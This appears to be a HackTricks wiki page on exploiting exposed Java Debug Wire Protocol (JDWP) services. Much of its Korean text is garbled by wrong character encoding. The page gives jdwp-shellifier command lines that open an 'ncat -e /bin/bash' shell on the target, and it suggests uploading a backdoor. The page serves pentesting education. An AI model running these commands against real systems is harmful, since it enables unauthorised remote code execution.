# Pentesting JDWP - Java Debug Wire Protocol

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**ì·¨ì•½ì  í‰ê°€ ë° ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•œ ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„¤ì •**. 20ê°œ ì´ìƒì˜ ë„êµ¬ì™€ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ ì–´ë””ì„œë‚˜ ì „ì²´ ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•˜ì„¸ìš”. ìš°ë¦¬ëŠ” ì¹¨íˆ¬ í…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ - ê·¸ë“¤ì´ ë” ê¹Šì´ íŒŒê³ ë“¤ê³ , ì…¸ì„ í„°ëœ¨ë¦¬ê³ , ì¬ë¯¸ë¥¼ ëŠë‚„ ìˆ˜ ìˆë„ë¡ ë§ì¶¤í˜• ë„êµ¬, íƒì§€ ë° ì•…ìš© ëª¨ë“ˆì„ ê°œë°œí•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Exploiting

JDWP ì•…ìš©ì€ **í”„ë¡œí† ì½œì˜ ì¸ì¦ ë° ì•”í˜¸í™” ë¶€ì¡±**ì— ë‹¬ë ¤ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ **í¬íŠ¸ 8000**ì—ì„œ ë°œê²¬ë˜ì§€ë§Œ ë‹¤ë¥¸ í¬íŠ¸ë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ˆê¸° ì—°ê²°ì€ ëŒ€ìƒ í¬íŠ¸ì— "JDWP-Handshake"ë¥¼ ì „ì†¡í•˜ì—¬ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. JDWP ì„œë¹„ìŠ¤ê°€ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ ë™ì¼í•œ ë¬¸ìì—´ë¡œ ì‘ë‹µí•˜ì—¬ ì¡´ì¬ë¥¼ í™•ì¸í•©ë‹ˆë‹¤. ì´ í•¸ë“œì…°ì´í¬ëŠ” ë„¤íŠ¸ì›Œí¬ì—ì„œ JDWP ì„œë¹„ìŠ¤ë¥¼ ì‹ë³„í•˜ëŠ” ì§€ë¬¸ ì¸ì‹ ë°©ë²•ìœ¼ë¡œ ì‘ìš©í•©ë‹ˆë‹¤.

í”„ë¡œì„¸ìŠ¤ ì‹ë³„ ì¸¡ë©´ì—ì„œ Java í”„ë¡œì„¸ìŠ¤ì—ì„œ "jdwk" ë¬¸ìì—´ì„ ê²€ìƒ‰í•˜ë©´ í™œì„± JDWP ì„¸ì…˜ì„ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì£¼ìš” ë„êµ¬ëŠ” [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier)ì…ë‹ˆë‹¤. ë‹¤ì–‘í•œ ë§¤ê°œë³€ìˆ˜ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
I found that the use of `--break-on 'java.lang.String.indexOf'` make the exploit more **stable**. And if you have the change to upload a backdoor to the host and execute it instead of executing a command, the exploit will be even more stable.

## More details

**This is a summary of [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. Check it for further details.


1. **JDWP ê°œìš”**:
- íŒ¨í‚· ê¸°ë°˜ì˜ ë„¤íŠ¸ì›Œí¬ ì´ì§„ í”„ë¡œí† ì½œë¡œ, ì£¼ë¡œ ë™ê¸°ì‹ì…ë‹ˆë‹¤.
- ì¸ì¦ ë° ì•”í˜¸í™”ê°€ ë¶€ì¡±í•˜ì—¬ ì ëŒ€ì ì¸ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë  ê²½ìš° ì·¨ì•½í•©ë‹ˆë‹¤.

2. **JDWP í•¸ë“œì…°ì´í¬**:
- í†µì‹ ì„ ì‹œì‘í•˜ê¸° ìœ„í•´ ê°„ë‹¨í•œ í•¸ë“œì…°ì´í¬ í”„ë¡œì„¸ìŠ¤ê°€ ì‚¬ìš©ë©ë‹ˆë‹¤. ë””ë²„ê±°(í´ë¼ì´ì–¸íŠ¸)ì™€ ë””ë²„ê¸°(ì„œë²„) ê°„ì— 14ì ASCII ë¬¸ìì—´ â€œJDWP-Handshakeâ€ê°€ êµí™˜ë©ë‹ˆë‹¤.

3. **JDWP í†µì‹ **:
- ë©”ì‹œì§€ëŠ” ê¸¸ì´, ID, í”Œë˜ê·¸ ë° ëª…ë ¹ ì§‘í•©ê³¼ ê°™ì€ í•„ë“œë¥¼ ê°€ì§„ ê°„ë‹¨í•œ êµ¬ì¡°ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.
- ëª…ë ¹ ì§‘í•© ê°’ì€ 0x40ì—ì„œ 0x80ê¹Œì§€ ë‹¤ì–‘í•˜ë©°, ì„œë¡œ ë‹¤ë¥¸ ë™ì‘ ë° ì´ë²¤íŠ¸ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

4. **ì•…ìš©**:
- JDWPëŠ” ì„ì˜ì˜ í´ë˜ìŠ¤ì™€ ë°”ì´íŠ¸ì½”ë“œë¥¼ ë¡œë“œí•˜ê³  í˜¸ì¶œí•  ìˆ˜ ìˆì–´ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•©ë‹ˆë‹¤.
- ì´ ê¸°ì‚¬ëŠ” Java ëŸ°íƒ€ì„ ì°¸ì¡°ë¥¼ ê°€ì ¸ì˜¤ê³ , ì¤‘ë‹¨ì ì„ ì„¤ì •í•˜ê³ , ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ëŠ” 5ë‹¨ê³„ì˜ ì•…ìš© í”„ë¡œì„¸ìŠ¤ë¥¼ ìì„¸íˆ ì„¤ëª…í•©ë‹ˆë‹¤.

5. **ì‹¤ì œ ì•…ìš©**:
- ì ì¬ì ì¸ ë°©í™”ë²½ ë³´í˜¸ì—ë„ ë¶ˆêµ¬í•˜ê³  JDWP ì„œë¹„ìŠ¤ëŠ” ë°œê²¬ ê°€ëŠ¥í•˜ë©° ì‹¤ì œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ShodanHQ ë° GitHubì™€ ê°™ì€ í”Œë«í¼ì—ì„œì˜ ê²€ìƒ‰ì„ í†µí•´ ì…ì¦ë©ë‹ˆë‹¤.
- ì´ ì•…ìš© ìŠ¤í¬ë¦½íŠ¸ëŠ” ë‹¤ì–‘í•œ JDK ë²„ì „ì—ì„œ í…ŒìŠ¤íŠ¸ë˜ì—ˆìœ¼ë©° í”Œë«í¼ì— ë…ë¦½ì ì´ë©° ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE)ì„ ì œê³µí•©ë‹ˆë‹¤.

6. **ë³´ì•ˆ ì˜ë¯¸**:
- ì¸í„°ë„·ì— ì—´ë¦° JDWP ì„œë¹„ìŠ¤ì˜ ì¡´ì¬ëŠ” ì •ê¸°ì ì¸ ë³´ì•ˆ ê²€í† , í”„ë¡œë•ì…˜ì—ì„œ ë””ë²„ê·¸ ê¸°ëŠ¥ ë¹„í™œì„±í™” ë° ì ì ˆí•œ ë°©í™”ë²½ êµ¬ì„±ì˜ í•„ìš”ì„±ì„ ê°•ì¡°í•©ë‹ˆë‹¤.


### **References:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<figure><img src="/.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**ì¦‰ì‹œ ì‚¬ìš© ê°€ëŠ¥í•œ ì·¨ì•½ì  í‰ê°€ ë° ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ ì„¤ì •**. 20ê°œ ì´ìƒì˜ ë„êµ¬ ë° ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ ì–´ë””ì„œë‚˜ ì „ì²´ ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ë¥¼ ì‹¤í–‰í•˜ì„¸ìš”. ìš°ë¦¬ëŠ” ì¹¨íˆ¬ í…ŒìŠ¤í„°ë¥¼ ëŒ€ì²´í•˜ì§€ ì•Šìœ¼ë©°, ê·¸ë“¤ì´ ë” ê¹Šì´ íŒŒê³ ë“¤ê³ , ì‰˜ì„ í„°ëœ¨ë¦¬ê³ , ì¬ë¯¸ë¥¼ ëŠë‚„ ìˆ˜ ìˆë„ë¡ ë§ì¶¤í˜• ë„êµ¬, íƒì§€ ë° ì•…ìš© ëª¨ë“ˆì„ ê°œë°œí•©ë‹ˆë‹¤.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
